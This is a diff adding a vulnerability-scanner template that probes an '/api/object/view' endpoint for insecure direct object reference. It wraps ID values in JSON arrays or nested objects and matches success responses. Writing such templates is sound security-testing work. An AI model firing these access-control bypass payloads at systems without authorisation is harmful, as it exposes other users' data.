@@ -1,0 +1,52 @@
+id: idor-json-wrapper
+info:
+  name: IDOR via JSON Array/Object Wrapping
+  author: WhiteFatalis
+  severity: high
+  description: Tests if wrapping the ID parameter in a JSON array or object bypasses access control checks.
+  tags: idor, logic, json
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/object/view"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"id": [{{target_id}}]}
+
+    payloads:
+      target_id:
+        - "1"
+        - "1337"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "success"
+          - "data"
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/object/view"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"id": {"id": {{target_id}}}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
